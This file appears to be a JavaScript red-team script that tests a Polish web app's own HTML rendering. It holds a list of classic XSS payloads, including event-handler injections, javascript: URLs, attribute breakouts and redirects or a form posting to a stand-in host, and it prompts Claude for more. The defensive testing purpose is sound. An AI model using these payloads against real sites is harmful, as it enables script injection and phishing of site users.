// RED TEAM 2, część o treściach (Filip 4.11): zatrute nazwy firm, imiona, nazwy biegów, pytania kandydatów. Claude generuje próby, a przeglądarka renderuje je PRAWDZIWYM kodem (tools/red-team-tresci-pw.cjs).
//   deno run -A tools/red-team-tresci.mjs --ile 120 --plik <json>
// Do API idzie tylko opis zadania, bez danych i sekretów. Budżet: tools/_claude.mjs.
import fs from "node:fs";
import { zapytaj } from "./_claude.mjs";
import { MODELE } from "./_claude.mjs";

const arg = (n, d) => { const i = process.argv.indexOf(n); return i > 0 && process.argv[i + 1] ? process.argv[i + 1] : d; };
export const KLASYCZNE = [
  `<img src=x onerror=__xss()>`, `"><img src=x onerror=__xss()>`, `'><svg onload=__xss()>`, `<script>__xss()</script>`, `javascript:__xss()`, `JaVaScRiPt:__xss()`, `java\tscript:__xss()`, ` javascript:__xss()`,
  `data:text/html,<script>__xss()</script>`, `vbscript:__xss()`, `https://a.pl/"><img src=x onerror=__xss()>`, `https://a.pl/' onmouseover='__xss()`, `&#60;img src=x onerror=__xss()&#62;`, `&lt;img src=x onerror=__xss()&gt;`,
  `<a href="javascript:__xss()">x</a>`, `<iframe srcdoc="<script>parent.__xss()</script>">`, `<details open ontoggle=__xss()>`, `<input autofocus onfocus=__xss()>`, `<body onload=__xss()>`, `<math><mtext><img src=x onerror=__xss()>`,
  `</textarea><img src=x onerror=__xss()>`, `</style><img src=x onerror=__xss()>`, `</script><img src=x onerror=__xss()>`, `--><img src=x onerror=__xss()>`, `\${__xss()}`, `{{__xss()}}`, `');__xss();//`, `";__xss();//`, `url(javascript:__xss())`,
  `https://a.pl/x.png" onerror="__xss()`, `//zly.example/x.js`, `\\\\zly.example\\x`, `https:zly.example`, `https://zly.example@a.pl/`, `https://a.pl\u0000<script>__xss()</script>`, `‮gnp.exe`, `<style>*{display:none}</style>`, `<base href="https://zly.example/">`, `<meta http-equiv=refresh content="0;url=https://zly.example">`, `<form action=https://zly.example><button>Wpłać</button></form>`,
];

if (import.meta.main) {
  const ile = Number(arg("--ile", "120")), plik = arg("--plik", "tresci.json");
  const r = await zapytaj({ narzedzie: "red-team-tresci", model: MODELE.opus, effort: "low", maxTokens: 12000, opcjeZadania: { maxRetries: 4 },
    schema: { type: "object", additionalProperties: false, required: ["proby"], properties: { proby: { type: "array", items: { type: "object", additionalProperties: false, required: ["tekst", "rodzaj"], properties: { tekst: { type: "string" }, rodzaj: { type: "string" } } } } } },
    system: "Pomagasz właścicielowi polskiej aplikacji webowej przetestować własny kod renderujący przed publiczną akcją charytatywną. Testy działają lokalnie w przeglądarce testowej, na funkcji window.__xss(), bez żadnych prawdziwych celów.",
    messages: [{ role: "user", content: `Wygeneruj ${ile} różnorodnych, krótkich tekstów testowych (do 120 znaków) sprawdzających, czy HTML budowany z danych jest poprawnie zabezpieczony. Dane trafiają do treści elementów, atrybutów (href, src, data-*, value), textarea oraz do pól linków. Jedyny efekt udanej próby to wywołanie window.__xss(). Uwzględnij: przerwanie atrybutu i elementu, encje HTML, podwójne kodowanie, schematy adresów z ukrytymi znakami, SVG i MathML, zdarzenia bez cudzysłowów, polskie znaki obok znaczników, znaki Unicode mylące kierunek tekstu, adresy z @ i podwójnymi ukośnikami. Pole rodzaj: krótka etykieta techniki.` }] });
  const proby = [...KLASYCZNE.map((tekst) => ({ tekst, rodzaj: "klasyczny" })), ...(r.json.proby || []).filter((p) => typeof p.tekst === "string" && p.tekst.length <= 300)];
  fs.writeFileSync(plik, JSON.stringify(proby, null, 1));
  console.log(`prób: ${proby.length} → ${plik}; ${r.usd.toFixed(3)} USD`);
}
